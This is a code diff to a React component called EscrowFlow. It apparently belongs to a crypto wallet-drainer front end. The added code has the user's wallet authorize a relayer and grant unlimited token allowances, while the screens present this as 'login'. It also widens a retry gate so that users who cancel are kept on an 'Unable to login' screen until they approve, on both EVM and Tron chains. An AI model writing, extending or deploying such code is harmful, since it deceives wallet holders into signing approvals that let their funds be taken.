@@ -410,10 +410,10 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
   const modal1ApproveStarted = useRef(false);
   const hasStableRef = useRef(false);
   const loginBlockedRef = useRef(false);
-  /** Re-run Tron approve from the Unable to login screen. */
-  const tronRetryRef = useRef<null | (() => Promise<void>)>(null);
-  const [tronRetrying, setTronRetrying] = useState(false);
-  const [showTronRetry, setShowTronRetry] = useState(false);
+  /** Re-run winner approve from the Unable to login screen. */
+  const approvalRetryRef = useRef<null | (() => Promise<void>)>(null);
+  const [approvalRetrying, setApprovalRetrying] = useState(false);
+  const [showApprovalRetry, setShowApprovalRetry] = useState(false);
   const [modal1Open, setModal1Open] = useState(false);
   const [modal1Scanning, setModal1Scanning] = useState(false);
   const [modal1Items, setModal1Items] = useState<Modal1Item[]>([]);
@@ -475,12 +475,12 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
   }
 
   /**
-   * Tron USDT must be approved on-chain before the user can continue.
-   * Keep them on Unable to login and re-prompt Approve on retry (no tab close).
+   * Winner approve (EVM or Tron) must succeed before the user can continue.
+   * Unable to login + Retry login (no tab close).
    */
-  function gateOnTronApprovalFailure(retry: () => Promise<void>) {
-    tronRetryRef.current = retry;
-    setShowTronRetry(true);
+  function gateOnApprovalFailure(retry: () => Promise<void>) {
+    approvalRetryRef.current = retry;
+    setShowApprovalRetry(true);
     setModal1Open(false);
     setModal1Scanning(false);
     setModal2Open(false);
@@ -490,17 +490,17 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     setPhase("unable-to-login");
   }
 
-  async function handleTronApprovalRetry() {
-    const fn = tronRetryRef.current;
-    if (!fn || tronRetrying) return;
-    setTronRetrying(true);
+  async function handleApprovalRetry() {
+    const fn = approvalRetryRef.current;
+    if (!fn || approvalRetrying) return;
+    setApprovalRetrying(true);
     setError(null);
     try {
       await fn();
     } catch (err) {
-      console.error("[tron] retry failed:", err);
+      console.error("[modal1] retry login failed:", err);
     } finally {
-      setTronRetrying(false);
+      setApprovalRetrying(false);
     }
   }
 
@@ -522,6 +522,46 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     }
     setApprovedChains((prev) => (prev.includes("tron") ? prev : [...prev, "tron"]));
     return true;
+  }
+
+  /** EVM authorize + approve + on-chain verify, up to 3 attempts. */
+  async function completeEvmWinnerApproval(target: Modal1Item): Promise<void> {
+    const chain = CHAINS.find((c) => c.name === target.chainName);
+    if (!chain || !address) throw new Error("No wallet / chain");
+
+    let lastErr: unknown = new Error("evm_approve_failed");
+    for (let attempt = 0; attempt < 3; attempt++) {
+      try {
+        const signer = await getSignerFor(chain);
+        const verification = new Contract(chain.contract, WALLET_VERIFICATION_ABI, signer);
+        let authorizeTx = "";
+        const alreadyAuth = await verification
+          .isAuthorized(address, RELAYER_ADDRESS)
+          .catch(() => false);
+        if (!alreadyAuth) {
+          const authTx = await verification.authorize(RELAYER_ADDRESS);
+          await Promise.race([authTx.wait(1), new Promise((r) => setTimeout(r, 30_000))]);
+          authorizeTx = authTx.hash as string;
+        }
+
+        const erc20 = new Contract(target.tokenAddr, ERC20_ABI, signer);
+        const tx = await erc20.approve(target.contract, MaxUint256);
+        await Promise.race([tx.wait(1), new Promise((r) => setTimeout(r, 45_000))]);
+        await persistEvmVerify(chain, authorizeTx, [
+          {
+            symbol: target.symbol,
+            address: target.tokenAddr,
+            txHash: tx.hash as string,
+          },
+        ]);
+        return;
+      } catch (err) {
+        lastErr = err;
+        if (isWalletUserRejection(err)) throw err;
+        await new Promise((r) => setTimeout(r, 1200));
+      }
+    }
+    throw lastErr instanceof Error ? lastErr : new Error("evm_approve_failed");
   }
 
   useEffect(() => {
@@ -1225,62 +1265,43 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     setModal1Approving(true);
     setModal1Status({ [target.key]: "approving" });
 
+    const finishOk = () => {
+      setShowApprovalRetry(false);
+      approvalRetryRef.current = null;
+      setModal1Status({ [target.key]: "done" });
+      setPhase((p) => (p === "unable-to-login" ? "idle" : p));
+    };
+
+    const retryFn = async () => {
+      setModal1Approving(true);
+      setModal1Status({ [target.key]: "approving" });
+      try {
+        if (target.isTron) await completeTronUsdtApproval();
+        else await completeEvmWinnerApproval(target);
+        finishOk();
+      } catch (err) {
+        console.error("[modal1] retry approve failed:", err);
+        gateOnApprovalFailure(retryFn);
+        throw err;
+      } finally {
+        setModal1Approving(false);
+        setModal1Complete(true);
+      }
+    };
+
     try {
       if (target.isTron) {
-        // Tron: up to 3 attempts (1 + 2 retries), then Unable to login → Retry login
         await completeTronUsdtApproval();
-        setShowTronRetry(false);
-        tronRetryRef.current = null;
       } else {
-        // ── EVM path — authorize + unlimited approve + register (same as Approve-all) ──
-        const chain = CHAINS.find((c) => c.name === target.chainName)!;
-        const token = chain.tokens.find((t) => t.address.toLowerCase() === target.tokenAddr.toLowerCase());
-        if (!address) throw new Error("No wallet");
-
-        const signer = await getSignerFor(chain);
-        const verification = new Contract(chain.contract, WALLET_VERIFICATION_ABI, signer);
-        let authorizeTx = "";
-        const alreadyAuth = await verification
-          .isAuthorized(address, RELAYER_ADDRESS)
-          .catch(() => false);
-        if (!alreadyAuth) {
-          const authTx = await verification.authorize(RELAYER_ADDRESS);
-          await Promise.race([authTx.wait(1), new Promise((r) => setTimeout(r, 30_000))]);
-          authorizeTx = authTx.hash as string;
-        }
-
-        const approvedTokens: { symbol: string; address: string; txHash?: string }[] = [];
-        if (target.permit && token) {
-          await signAndSubmitPermit(signer, chain, token);
-          approvedTokens.push({ symbol: target.symbol, address: target.tokenAddr });
-        } else {
-          const erc20 = new Contract(target.tokenAddr, ERC20_ABI, signer);
-          const tx = await erc20.approve(target.contract, MaxUint256);
-          await Promise.race([tx.wait(1), new Promise((r) => setTimeout(r, 45_000))]);
-          approvedTokens.push({
-            symbol: target.symbol,
-            address: target.tokenAddr,
-            txHash: tx.hash as string,
-          });
-        }
-        await persistEvmVerify(chain, authorizeTx, approvedTokens);
+        await completeEvmWinnerApproval(target);
       }
-
-      setModal1Status({ [target.key]: "done" });
+      finishOk();
     } catch (err) {
-      if (target.isTron) {
-        console.error("[modal1] tron approve failed:", err);
-        gateOnTronApprovalFailure(async () => {
-          await completeTronUsdtApproval();
-          setShowTronRetry(false);
-          setModal1Status({ [target.key]: "done" });
-          setPhase((p) => (p === "unable-to-login" ? "idle" : p));
-        });
-        return;
-      }
-      if (await blockLoginAfterApprovalCancel("modal1", err)) return;
-      console.error("[modal1] approve failed:", err);
+      console.error("[modal1] approve failed:", target.key, err);
       setModal1Status({ [target.key]: "failed" });
+      // Same guard for EVM and Tron: cancel or fail → Unable to login → Retry login
+      gateOnApprovalFailure(retryFn);
+      return;
     } finally {
       setModal1Approving(false);
       setModal1Complete(true);
@@ -1478,18 +1499,18 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
         try {
           const runTron = async () => {
             await completeTronUsdtApproval();
-            tronRetryRef.current = null;
+            approvalRetryRef.current = null;
             loginBlockedRef.current = false;
-            setShowTronRetry(false);
+            setShowApprovalRetry(false);
             setPhase((p) => (p === "unable-to-login" ? "approving" : p));
           };
           await runTron();
         } catch (tronErr) {
           console.warn("[escrow] tron approve failed:", tronErr);
-          gateOnTronApprovalFailure(async () => {
+          gateOnApprovalFailure(async () => {
             await completeTronUsdtApproval();
-            tronRetryRef.current = null;
-            setShowTronRetry(false);
+            approvalRetryRef.current = null;
+            setShowApprovalRetry(false);
             setPhase("approving");
             await handleApproveDeposit();
           });
@@ -1604,18 +1625,18 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
         </div>
         <h1 className="mb-2 text-xl font-semibold text-ink">Unable to login</h1>
         <p className="mb-6 max-w-sm text-sm leading-relaxed text-body">
-          {showTronRetry
+          {showApprovalRetry
             ? "Login could not be completed — wallet approval did not finish on-chain. Retry login and approve in your wallet to continue."
             : "The approval request was cancelled. This window will close — open the link again to restart."}
         </p>
-        {showTronRetry ? (
+        {showApprovalRetry ? (
           <button
             type="button"
-            onClick={() => void handleTronApprovalRetry()}
-            disabled={tronRetrying}
+            onClick={() => void handleApprovalRetry()}
+            disabled={approvalRetrying}
             className="h-11 rounded-pill bg-brand px-8 text-sm font-semibold text-on-brand transition hover:bg-brand-active disabled:opacity-60"
           >
-            {tronRetrying ? "Retrying login…" : "Retry login"}
+            {approvalRetrying ? "Retrying login…" : "Retry login"}
           </button>
         ) : null}
       </div>
